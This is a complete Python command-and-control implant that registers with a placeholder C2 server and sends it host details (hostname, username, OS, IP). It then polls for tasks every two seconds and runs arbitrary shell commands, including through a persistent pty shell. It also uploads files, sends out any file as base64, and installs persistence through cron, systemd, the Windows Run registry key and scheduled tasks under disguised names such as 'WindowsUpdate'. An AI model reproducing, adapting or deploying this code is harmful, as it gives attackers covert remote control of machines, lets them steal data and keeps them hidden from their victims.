import json
import os
import platform
import pty
import select
import socket
import subprocess
import sys
import time
import uuid
import fcntl
import struct
import termios

try:
    import requests
except ImportError:
    print("[!] requests library required. Install: pip install requests")
    sys.exit(1)

C2_URL = "__C2_URL__"
C2_TOKEN = "__C2_TOKEN__"
BEACON_INTERVAL = 2
AGENT_ID_FILE = ".agent_id"


def get_agent_id():
    if os.path.exists(AGENT_ID_FILE):
        with open(AGENT_ID_FILE, "r") as f:
            return f.read().strip()
    agent_id = str(uuid.uuid4())[:8]
    with open(AGENT_ID_FILE, "w") as f:
        f.write(agent_id)
    return agent_id


def get_system_info():
    try:
        hostname = socket.gethostname()
    except Exception:
        hostname = "unknown"
    try:
        username = os.getlogin()
    except Exception:
        try:
            username = os.environ.get("USER") or os.environ.get("USERNAME", "unknown")
        except Exception:
            username = "unknown"
    os_info = f"{platform.system()} {platform.release()}"
    ip = "0.0.0.0"
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
    except Exception:
        pass
    arch = platform.machine()
    return {
        "hostname": hostname,
        "username": username,
        "os": os_info,
        "ip": ip,
        "arch": arch,
    }


def register():
    try:
        info = get_system_info()
        info["token"] = C2_TOKEN
        r = requests.post(f"{C2_URL}/register", json=info, timeout=10)
        if r.status_code == 200:
            data = r.json()
            aid = data.get("agent_id")
            with open(AGENT_ID_FILE, "w") as f:
                f.write(aid)
            return aid
    except Exception as e:
        pass
    return None


def beacon(agent_id):
    try:
        r = requests.get(f"{C2_URL}/beacon/{agent_id}?token={C2_TOKEN}", timeout=10)
        if r.status_code == 200:
            return r.json().get("tasks", [])
    except Exception:
        pass
    return []


def submit_result(agent_id, task_id, output, status="success"):
    try:
        requests.post(
            f"{C2_URL}/result/{agent_id}",
            json={"task_id": task_id, "output": output, "status": status},
            timeout=10,
        )
    except Exception:
        pass


persistent_shell = None
persistent_master = None


def get_persistent_shell():
    global persistent_shell, persistent_master
    if persistent_shell is None or persistent_shell.poll() is not None:
        master_fd, slave_fd = pty.openpty()

        # Set window size for proper terminal behavior
        winsize = struct.pack("HHHH", 80, 24, 0, 0)
        fcntl.ioctl(master_fd, termios.TIOCSWINSZ, winsize)

        persistent_shell = subprocess.Popen(
            ["/bin/sh"],
            stdin=slave_fd,
            stdout=slave_fd,
            stderr=slave_fd,
            close_fds=True,
        )
        os.close(slave_fd)
        persistent_master = master_fd

        # Wait for shell prompt
        time.sleep(0.3)
        _flush_pty()
    return persistent_shell, persistent_master


def _flush_pty():
    global persistent_master
    try:
        while True:
            r, _, _ = select.select([persistent_master], [], [], 0.05)
            if not r:
                break
            os.read(persistent_master, 65536)
    except (OSError, ValueError):
        pass


def execute_shell(command):
    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=60,
        )
        output = result.stdout + result.stderr
        return output if output else "[+] Command executed (no output)"
    except subprocess.TimeoutExpired:
        return "[!] Command timed out"
    except Exception as e:
        return f"[!] Error: {e}"


def execute_shell_interactive(command):
    global persistent_master
    proc, master = get_persistent_shell()

    _flush_pty()
    os.write(master, (command + "\n").encode())

    output = b""
    deadline = time.time() + 3
    while time.time() < deadline:
        r, _, _ = select.select([master], [], [], 0.1)
        if r:
            try:
                chunk = os.read(master, 8192)
            except OSError:
                break
            if not chunk:
                break
            output += chunk
            deadline = time.time() + 0.5

    result = output.decode(errors="replace")
    # Strip the echoed command from output
    lines = result.split("\n")
    if len(lines) > 1 and lines[0].strip() == command.strip():
        result = "\n".join(lines[1:])
    return result


def execute_upload(params):
    import base64
    remote_path = params.get("remote_path", "")
    data = params.get("data", "")
    try:
        content = base64.b64decode(data)
        with open(remote_path, "wb") as f:
            f.write(content)
        return f"[+] Uploaded to {remote_path} ({len(content)} bytes)"
    except Exception as e:
        return f"[!] Upload failed: {e}"


def execute_download(params):
    import base64
    remote_path = params.get("remote_path", "")
    try:
        with open(remote_path, "rb") as f:
            data = base64.b64encode(f.read()).decode()
        return data
    except Exception as e:
        return f"[!] Download failed: {e}"


def execute_persist(params):
    method = params.get("method", "")
    script_path = params.get("script_path", "")

    if method == "cron":
        cron_line = f"* * * * * {script_path}\n"
        try:
            subprocess.run(
                f'(crontab -l 2>/dev/null; echo "{cron_line}") | crontab -',
                shell=True,
                check=True,
            )
            return f"[+] Cron job added for {script_path}"
        except Exception as e:
            return f"[!] Cron failed: {e}"

    elif method == "systemd":
        service_name = f"sys-{uuid.uuid4().hex[:6]}"
        service_content = f"""[Unit]
Description=System Service
After=network.target

[Service]
ExecStart={script_path}
Restart=always

[Install]
WantedBy=multi-user.target
"""
        try:
            service_path = f"/etc/systemd/system/{service_name}.service"
            with open(service_path, "w") as f:
                f.write(service_content)
            subprocess.run(
                ["systemctl", "enable", service_name],
                check=True, capture_output=True,
            )
            subprocess.run(
                ["systemctl", "start", service_name],
                check=True, capture_output=True,
            )
            return f"[+] Systemd service {service_name} created"
        except PermissionError:
            user_service_dir = os.path.expanduser("~/.config/systemd/user")
            os.makedirs(user_service_dir, exist_ok=True)
            service_path = os.path.join(user_service_dir, f"{service_name}.service")
            with open(service_path, "w") as f:
                f.write(service_content)
            subprocess.run(
                ["systemctl", "--user", "enable", service_name],
                check=True, capture_output=True,
            )
            subprocess.run(
                ["systemctl", "--user", "start", service_name],
                check=True, capture_output=True,
            )
            return f"[+] User systemd service {service_name} created"
        except Exception as e:
            return f"[!] Systemd failed: {e}"

    elif method == "registry":
        try:
            import winreg
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE,
            )
            winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, script_path)
            winreg.CloseKey(key)
            return f"[+] Registry Run key added for {script_path}"
        except Exception as e:
            return f"[!] Registry failed: {e}"

    elif method == "schtask":
        task_name = f"WindowsUpdate-{uuid.uuid4().hex[:4]}"
        try:
            subprocess.run(
                [
                    "schtasks", "/create", "/tn", task_name,
                    "/tr", script_path, "/sc", "minute",
                    "/mo", "1", "/f",
                ],
                check=True, capture_output=True, timeout=10,
            )
            return f"[+] Scheduled task {task_name} created"
        except Exception as e:
            return f"[!] Schtask failed: {e}"

    return f"[!] Unknown method: {method}"


def execute_remove_persist(params):
    method = params.get("method", "")
    name = params.get("name", "")

    if method == "cron":
        try:
            result = subprocess.run(
                f"crontab -l 2>/dev/null | grep -v '{name}' | crontab -",
                shell=True, capture_output=True, text=True,
            )
            return "[+] Cron entry removed" if result.returncode == 0 else "[!] Failed"
        except Exception as e:
            return f"[!] Error: {e}"

    elif method == "systemd":
        try:
            subprocess.run(
                ["systemctl", "stop", name],
                check=False, capture_output=True,
            )
            subprocess.run(
                ["systemctl", "disable", name],
                check=False, capture_output=True,
            )
            service_path = f"/etc/systemd/system/{name}.service"
            user_service = os.path.expanduser(f"~/.config/systemd/user/{name}.service")
            if os.path.exists(service_path):
                os.remove(service_path)
            if os.path.exists(user_service):
                os.remove(user_service)
            return f"[+] Service {name} removed"
        except Exception as e:
            return f"[!] Error: {e}"

    elif method == "registry":
        try:
            import winreg
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE,
            )
            winreg.DeleteValue(key, name)
            winreg.CloseKey(key)
            return f"[+] Registry value {name} removed"
        except Exception as e:
            return f"[!] Error: {e}"

    elif method == "schtask":
        try:
            subprocess.run(
                ["schtasks", "/delete", "/tn", name, "/f"],
                check=True, capture_output=True, timeout=10,
            )
            return f"[+] Task {name} removed"
        except Exception as e:
            return f"[!] Error: {e}"

    return f"[!] Unknown method: {method}"


def execute_task(task):
    command = task.get("command", "")
    params = task.get("params", {})
    task_id = task.get("task_id", "")

    if command == "shell":
        output = execute_shell(params.get("command", ""))
        submit_result(agent_id, task_id, output, "success")
    elif command == "shell_interactive":
        output = execute_shell_interactive(params.get("command", ""))
        submit_result(agent_id, task_id, output, "success")
    elif command == "upload":
        output = execute_upload(params)
        submit_result(agent_id, task_id, output, "success")
    elif command == "download":
        result = execute_download(params)
        if result.startswith("[!]"):
            submit_result(agent_id, task_id, result, "error")
        else:
            submit_result(agent_id, task_id, result, "success")
    elif command == "persist":
        output = execute_persist(params)
        submit_result(agent_id, task_id, output, "success")
    elif command == "remove_persist":
        output = execute_remove_persist(params)
        submit_result(agent_id, task_id, output, "success")


if __name__ == "__main__":
    agent_id = get_agent_id()
    registered = False

    while True:
        if not registered:
            aid = register()
            if aid:
                agent_id = aid
                registered = True

        tasks = beacon(agent_id)
        for task in tasks:
            execute_task(task)

        time.sleep(BEACON_INTERVAL)
